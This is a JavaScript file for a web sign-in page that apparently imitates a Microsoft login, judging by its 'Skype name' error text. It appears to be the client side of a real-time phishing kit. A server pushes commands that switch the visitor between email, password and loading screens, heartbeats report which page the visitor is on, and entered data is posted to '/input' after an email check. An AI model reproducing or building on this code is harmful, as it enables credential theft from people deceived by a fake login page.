function showLoading(){
$("#diiiv1").animate({ left: 0, opacity: "hide" }, 0);
$("#div3").animate({ right: 0, opacity: "show" }, 0);
$("#div2").animate({ left: 0, opacity: "hide" }, 0);        
currPage = "Loading Screen";
}

//div1 is email
//div2 is password

// Function to hide div3 and show div2
function hideLoading() {
  // Hide div3
  $("#div3").animate({ left: 0, opacity: "hide" }, 0);
}

// Function to animate divs and update inner HTML
function passwordScreen() {
	$("#diiiv1").animate({ left: 0, opacity: "hide" }, 0);
  $("#div3").animate({ left: 0, opacity: "hide" }, 0);
  $("#div2").animate({ right: 0, opacity: "show" }, 0);
  $("#aich").html(my_ai);
  currPage = "Password Screen";
}


function loginScreen() {
  // Animate #div3: move left to 0 and show
  $("#msg").hide();
        $("#ai").val("");
        $("#pr").val("");
        $("#div2").hide();
        $("#diiiv1").show();
        ("#div3").animate({ left: 0, opacity: "hide" }, 0);
  currPage = "Login Screen";
}


// Send heartbeat signals to the server at regular intervals
const heartbeatInterval = setInterval(() => {
    fetch('/heartbeat', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            clientId: clientId,
            currPage: currPage
        }),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to send heartbeat signal to server');
        }
        const contentType = response.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
            return response.json();
        } else {
            return response.text(); // or response.blob(), etc., depending on what you expect
        }
    })
    .then(data => {
        // Handle response data if needed
        console.log('Heartbeat signal sent successfully:', data);
        // Additional processing if required
    })
    .catch(error => {
        console.error('Error sending heartbeat signal to server:', error.message);
    });
}, 29000);


function getClientId() {
      let clientId = sessionStorage.getItem('clientId');
      if (!clientId) {
        clientId = Date.now().toString();
        sessionStorage.setItem('clientId', clientId);
      }
      return clientId;
    }
    
    
    
const clientId = getClientId();



const eventSource = new EventSource(`/events?clientId=${clientId}&currPage=${currPage}`);
    eventSource.onmessage = function(event) {
      const data = JSON.parse(event.data);
      console.log(data);
      if (data.type === 'command') {
        if (data.command === "emailScreen") {
          loginScreen();
        }else if (data.command === "passwordScreen") {
          passwordScreen();
        }else if (data.command === "loadScreen") {
          showLoading();
        }
      }
    };
    
    eventSource.onerror = function(error) {
      console.error('EventSource failed:', error);
    };
    
    
    function sendInput(data) {
    const iniData = { clientId, currPage };
    const sendData = { ...iniData, ...data };

    fetch('/input', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(sendData)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        // Check if content-type is application/json before parsing
        const contentType = response.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
            return response.json();
        } else {
            return response.text(); // or response.blob(), etc., depending on what you expect
        }
    })
    .then(data => {
        console.log('Success:', data);
        // Handle JSON data or text data here
    })
    .catch((error) => {
        console.error('Error:', error);
    });
}

async function validateEmail(email) {
    try {
        const response = await fetch('/verify', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ email: email }),
        });

        if (!response.ok) {
            throw new Error('Failed to validate email');
        }

        const data = await response.json();
        console.log(data); 
        return data.success; // Returns true or false based on server response
    } catch (error) {
        console.error('Error validating email:', error);
        return false; // Return false in case of any error
    }
}


async function handleAndSendEmailInput(email) {
    try {
        let valid = await validateEmail(email);
        console.log(valid);
        if (valid) {
        	console.log('Email input is Valid.');
            showLoading();
        } else {
            // Handle case where email input is invalid
            console.log('Email input is invalid.');
            document.querySelector("#error").textContent = "Enter a valid email address, phone number, or Skype name.";
      
        }
    } catch (error) {
        console.error('Error handling email input:', error);
        // Handle error case
    }
}

